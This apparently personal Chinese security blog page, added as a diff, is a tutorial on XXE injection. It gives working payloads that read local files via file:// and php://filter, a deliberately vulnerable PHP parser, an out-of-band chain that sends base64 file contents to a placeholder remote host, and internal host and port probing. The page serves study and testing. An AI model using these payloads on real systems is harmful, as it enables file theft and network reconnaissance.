@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.4.2',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="基础知识xml格式XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子示例代码:1234567&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;//这一行是 XML 文档定义&amp;lt;!DOCTYPE message [&amp;lt;!ELEMENT message (recei">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE漏洞学习">
+<meta property="og:url" content="http://yoursite.com/2019/11/01/XXE漏洞学习/index.html">
+<meta property="og:site_name" content="drag0n">
+<meta property="og:description" content="基础知识xml格式XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子示例代码:1234567&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;//这一行是 XML 文档定义&amp;lt;!DOCTYPE message [&amp;lt;!ELEMENT message (recei">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2019/11/01/XXE漏洞学习/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/01/XXE漏洞学习/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/01/XXE漏洞学习/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/01/XXE漏洞学习/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/01/XXE漏洞学习/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/01/XXE漏洞学习/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/01/XXE漏洞学习/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/01/XXE漏洞学习/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/01/XXE漏洞学习/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/01/XXE漏洞学习/10.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/01/XXE漏洞学习/11.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/01/XXE漏洞学习/12.png">
+<meta property="og:updated_time" content="2019-11-01T10:33:47.170Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XXE漏洞学习">
+<meta name="twitter:description" content="基础知识xml格式XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子示例代码:1234567&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;//这一行是 XML 文档定义&amp;lt;!DOCTYPE message [&amp;lt;!ELEMENT message (recei">
+<meta name="twitter:image" content="http://yoursite.com/2019/11/01/XXE漏洞学习/1.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/11/01/XXE漏洞学习/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>XXE漏洞学习 | drag0n</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">drag0n</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/01/XXE漏洞学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="drag0n">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XXE漏洞学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2019-11-01 18:28:32 / 修改时间：18:33:47" itemprop="dateCreated datePublished" datetime="2019-11-01T18:28:32+08:00">2019-11-01</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="xml格式"><a href="#xml格式" class="headerlink" title="xml格式"></a>xml格式</h2><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子</p><p><strong>示例代码:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+
+<p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p>
+<p><strong>示例代码:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="xml实体"><a href="#xml实体" class="headerlink" title="xml实体"></a>xml实体</h2><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的</p>
+<p><strong>示例代码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;  //使用ENTITY可以定义实体</span><br></pre></td></tr></table></figure>
+
+<p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p>
+<p><strong>示例代码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，但是实体实际上可以调用外部的文件，这就导致了XXE漏洞的出现。</p>
+<h2 id="读取敏感文件（有回显）"><a href="#读取敏感文件（有回显）" class="headerlink" title="读取敏感文件（有回显）"></a>读取敏感文件（有回显）</h2><p><img src="/2019/11/01/XXE漏洞学习/1.png" alt="1"></p>
+<p>我们抓包查看，可以看到，xml中的bee被输出到了页面上</p>
+<p><img src="/2019/11/01/XXE漏洞学习/2.png" alt="2"></p>
+<p>服务能接收并解析 XML 格式的输入并且有回显，所以我们直接构造payload调用外部实体读取系统敏感文件。</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt; //构造外部实体xxe，内容为win.ini文件内容</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/01/XXE漏洞学习/3.png" alt="3"></p>
+<p>因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，<strong>那么我么要是换成下面这个文件呢？</strong></p>
+<p><img src="/2019/11/01/XXE漏洞学习/4.png" alt="4"></p>
+<p>我们试一下</p>
+<p><img src="/2019/11/01/XXE漏洞学习/5.png" alt="5"></p>
+<p>可以看到，由于文件中带有特殊符号，不但没有读到我们想要的文件，而且还给我们报了一堆错，怎么办？</p>
+<p>在php中，我们可以使用php协议来对要读取的文件进行base64加密，读出内容后解密即可</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/1.txt&quot; &gt;]&gt; //使用php协议对要读取的文件进行base64编码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/01/XXE漏洞学习/6.png" alt="6"></p>
+<h2 id="读取敏感文件（无回显）"><a href="#读取敏感文件（无回显）" class="headerlink" title="读取敏感文件（无回显）"></a>读取敏感文件（无回显）</h2><p>在实际测试中，更多的XXE注入是没有回显的，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带：</p>
+<p><strong>测试源码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);   //去除所有报错信息</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>test.dtd</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://ip?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试开始，在自己的服务器上创建test.dtd文件</p>
+<p><img src="/2019/11/01/XXE漏洞学习/7.png" alt="7"></p>
+<p>访问漏洞文件，传入payload</p>
+<p><img src="/2019/11/01/XXE漏洞学习/8.png" alt="8"></p>
+<p>访问apache的日志即可看到读取到的base64加密的文件内容</p>
+<p><img src="/2019/11/01/XXE漏洞学习/9.png" alt="9"></p>
+<p><strong>整个调用过程：</strong></p>
+<p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote  先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的  %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %,  所以将其转成html实体编码 <code>&amp;#37;</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
+<h1 id="新的利用："><a href="#新的利用：" class="headerlink" title="新的利用："></a><strong>新的利用：</strong></h1><p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议。</p>
+<p><img src="/2019/11/01/XXE漏洞学习/10.png" alt="10"></p>
+<h2 id="内网主机及端口探测"><a href="#内网主机及端口探测" class="headerlink" title="内网主机及端口探测"></a>内网主机及端口探测</h2><p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。可以实现对内网主机的探测。</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE reset [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://172.168.1.2/&quot; &gt;]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;&amp;xxe;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以通过响应时间来确认服务器是否存活，端口探测同理，加上端口即可</p>
+<p><strong>存活：</strong></p>
+<p><img src="/2019/11/01/XXE漏洞学习/11.png" alt="11"></p>
+<p><strong>未存活</strong></p>
+<p><img src="/2019/11/01/XXE漏洞学习/12.png" alt="12"></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2019/10/18/python之注入脚本编写/" rel="next" title="python之注入脚本编写">
+                  <i class="fa fa-chevron-left"></i> python之注入脚本编写
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基础知识"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xml格式"><span class="nav-number">1.1.</span> <span class="nav-text">xml格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xml实体"><span class="nav-number">1.2.</span> <span class="nav-text">xml实体</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#读取敏感文件（有回显）"><span class="nav-number">2.1.</span> <span class="nav-text">读取敏感文件（有回显）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读取敏感文件（无回显）"><span class="nav-number">2.2.</span> <span class="nav-text">读取敏感文件（无回显）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#新的利用："><span class="nav-number">3.</span> <span class="nav-text">新的利用：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#内网主机及端口探测"><span class="nav-number">3.1.</span> <span class="nav-text">内网主机及端口探测</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文章"><span class="nav-number">4.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="site-author-image" itemprop="image" alt=""
+    src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://muse.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.2
+  </div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
